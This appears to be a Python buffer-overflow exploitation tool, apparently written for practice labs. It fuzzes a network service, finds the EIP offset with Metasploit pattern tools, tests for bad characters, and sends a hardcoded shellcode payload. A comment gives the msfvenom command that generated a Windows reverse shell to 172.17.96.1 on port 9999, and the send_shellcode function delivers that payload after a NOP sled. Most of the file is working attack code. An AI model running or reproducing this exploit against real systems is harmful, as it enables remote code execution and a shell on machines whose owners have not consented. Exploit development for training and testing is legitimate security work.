#!/usr/bin/python3.9

# basic use of this script, find the command to fuzz then let it run till crash
# let it use the metasploit framework tool to make a string for it to crash with again
# after that crash enter the characters within the eip and it will provide the offset
# now search for a module using mona that has no memory protections
# make note of a memory address for that module
# set a breakpoint at the found address
# use the test module tool to place the memory address within the eip
# you might need to change the offset by 1 for it to work
# the guides i used don't do that but i couldn't reproduce without subtracting 1

# TODO fix issues with adding padding for final part of exploit

import socket
import subprocess
import argparse
from time import sleep
import binascii

parser = argparse.ArgumentParser()
parser.add_argument('host', help="Server address")
parser.add_argument('port', type=int, help="Port of server")
args = parser.parse_args()


# replace this with the memory address/bad characters
memory_chars = '\xaf\x11\x50\x62'

# use msfvenom to generate shellcode, replace ip address and port and badchars
# msfvenom -p windows/shell_reverse_tcp LHOST=172.17.96.1 LPORT=9999 EXITFUNC=thread -f c -a x86 -b '\x00'
bad_chars = '\x00'

# padding for the shellcode, 32 should be fine adjust if you find issues on this step
padding = 32

# this is the payload that will be sent to run code
shellcode = (
    "\xda\xdc\xd9\x74\x24\xf4\xbb\x41\x43\xa7\x29\x5f\x2b\xc9"
    "\xb1\x52\x31\x5f\x17\x83\xc7\x04\x03\x1e\x50\x45\xdc\x5c"
    "\xbe\x0b\x1f\x9c\x3f\x6c\xa9\x79\x0e\xac\xcd\x0a\x21\x1c"
    "\x85\x5e\xce\xd7\xcb\x4a\x45\x95\xc3\x7d\xee\x10\x32\xb0"
    "\xef\x09\x06\xd3\x73\x50\x5b\x33\x4d\x9b\xae\x32\x8a\xc6"
    "\x43\x66\x43\x8c\xf6\x96\xe0\xd8\xca\x1d\xba\xcd\x4a\xc2"
    "\x0b\xef\x7b\x55\x07\xb6\x5b\x54\xc4\xc2\xd5\x4e\x09\xee"
    "\xac\xe5\xf9\x84\x2e\x2f\x30\x64\x9c\x0e\xfc\x97\xdc\x57"
    "\x3b\x48\xab\xa1\x3f\xf5\xac\x76\x3d\x21\x38\x6c\xe5\xa2"
    "\x9a\x48\x17\x66\x7c\x1b\x1b\xc3\x0a\x43\x38\xd2\xdf\xf8"
    "\x44\x5f\xde\x2e\xcd\x1b\xc5\xea\x95\xf8\x64\xab\x73\xae"
    "\x99\xab\xdb\x0f\x3c\xa0\xf6\x44\x4d\xeb\x9e\xa9\x7c\x13"
    "\x5f\xa6\xf7\x60\x6d\x69\xac\xee\xdd\xe2\x6a\xe9\x22\xd9"
    "\xcb\x65\xdd\xe2\x2b\xac\x1a\xb6\x7b\xc6\x8b\xb7\x17\x16"
    "\x33\x62\xb7\x46\x9b\xdd\x78\x36\x5b\x8e\x10\x5c\x54\xf1"
    "\x01\x5f\xbe\x9a\xa8\x9a\x29\x09\x3d\xc8\x42\x39\x3c\x10"
    "\x8b\xdb\xc9\xf6\xd9\x0b\x9c\xa1\x75\xb5\x85\x39\xe7\x3a"
    "\x10\x44\x27\xb0\x97\xb9\xe6\x31\xdd\xa9\x9f\xb1\xa8\x93"
    "\x36\xcd\x06\xbb\xd5\x5c\xcd\x3b\x93\x7c\x5a\x6c\xf4\xb3"
    "\x93\xf8\xe8\xea\x0d\x1e\xf1\x6b\x75\x9a\x2e\x48\x78\x23"
    "\xa2\xf4\x5e\x33\x7a\xf4\xda\x67\xd2\xa3\xb4\xd1\x94\x1d"
    "\x77\x8b\x4e\xf1\xd1\x5b\x16\x39\xe2\x1d\x17\x14\x94\xc1"
    "\xa6\xc1\xe1\xfe\x07\x86\xe5\x87\x75\x36\x09\x52\x3e\x56"
    "\xe8\x76\x4b\xff\xb5\x13\xf6\x62\x46\xce\x35\x9b\xc5\xfa"
    "\xc5\x58\xd5\x8f\xc0\x25\x51\x7c\xb9\x36\x34\x82\x6e\x36"
    "\x1d"
    )


def connection_init():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    check = s.connect_ex((args.host, args.port))

    if check:
        print('Issue connection to server: %s' % check)
        connection = False
    else:
        print(s.recv(1024).decode())
        connection = True
    return s,connection


def send_message(s, payload):
    s.send(payload.encode())


def overflow_tools():
    toolbox = ('fuzzer','manual','shell','check','test eip','badchars','test module','help','send shellcode')
    while True:
        tool = input('tools> ')
        if tool == toolbox[0]:
            command = input('Enter the command to fuzz: ')
            offset_fuzzer(command)
        elif tool == toolbox[1]:
            manual_fuzz()
        elif tool == toolbox[2]:
            break
        elif tool == toolbox[3]:
            connection_init()
        elif tool == toolbox[4]:
            test_eip()
        elif tool == toolbox[5]:
            finding_bad_chars()
        elif tool == toolbox[6]:
            module_test()
        elif tool == toolbox[7]:
            print(toolbox)
        elif tool == toolbox[8]:
            send_shellcode()
    return


def manual_fuzz():
    command = input('Enter command: ')
    chars = input('Enter number of characters to send: ')
    payload = ''.join([command, ' ', 'A' * int(chars)])
    s,connection = connection_init()
    send_message(s, payload)


def offset_fuzzer(command):
    crash = ''
    buffer = ''
    rough_fuzzing = True
    fine_fuzzing = True
    while rough_fuzzing:
        try:
            crash = crash + 'A'*300
            payload = ''.join([command, crash])
            s,connection = connection_init()
            send_message(s, payload)
            print('%d %s' % (len(crash), s.recv(1024).decode()))
            buffer = crash
            sleep(1)
        except:
            print('Crashes between %d and %d bytes' % (len(buffer), len(crash)))
            rough_fuzzing = False
            cont = input('Restart the server then hit enter to continue.')
    
    print('Checking connection')
    s,connection = connection_init()
    test = input('Send test command: ')
    send_message(s, test)
    print(s.recv(1024).decode())

    script = '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb'
    arg1 = '-l'
    arg2 = str(len(crash))
    offset_pattern = subprocess.run([script, arg1, arg2], capture_output=True)
    print(offset_pattern.stdout.decode())
    payload = ''.join([command, offset_pattern.stdout.decode()])
    send_message(s, payload)

    script = '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb'
    arg3 = '-q'
    eip_chars = input('Enter the characters in the EIP after the crash: ')
    offset_find = subprocess.run([script, arg1, arg2, arg3, eip_chars], capture_output=True)
    print(offset_find.stdout.decode())


def test_eip(badchars=''):
    command = input('Enter the vulnerable command: ')
    offset = int(input('What was the determined offset? '))
    eip_len = int(input('What is the eip length? '))
    payload = ''.join([command, 'A' * offset, 'B' * eip_len, badchars])
    s,connection = connection_init()
    send_message(s, payload)
    print('Check eip for 42s, should be full if the offset was correct.')


def finding_bad_chars():
    badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )
    test_eip(badchars)
    print('Look at the ESP dump for characters replaced by B0.')


def module_test():
    command = input('Enter command: ')
    chars = input('Enter the offset: ')

    payload = ''.join([command, 'A' * int(chars), str(memory_chars)])

    s,connection = connection_init()
    send_message(s, payload)


def send_shellcode():
    command = input('Enter command: ')
    chars = input('Enter the offset: ')

    payload = ''.join([command, 'A' * int(chars), str(memory_chars), '\x90' * 32, shellcode])
    print(payload)

    s,connection = connection_init()
    send_message(s, payload)


if __name__ == '__main__':
    
    s,connection = connection_init()

    while connection:
        message = input('-> ')
        print(message)
        if message == 'tools':
            overflow_tools()
            connection_init()
        else:
            send_message(s, message)
            print(s.recv(1024).decode())
    
    s.close()


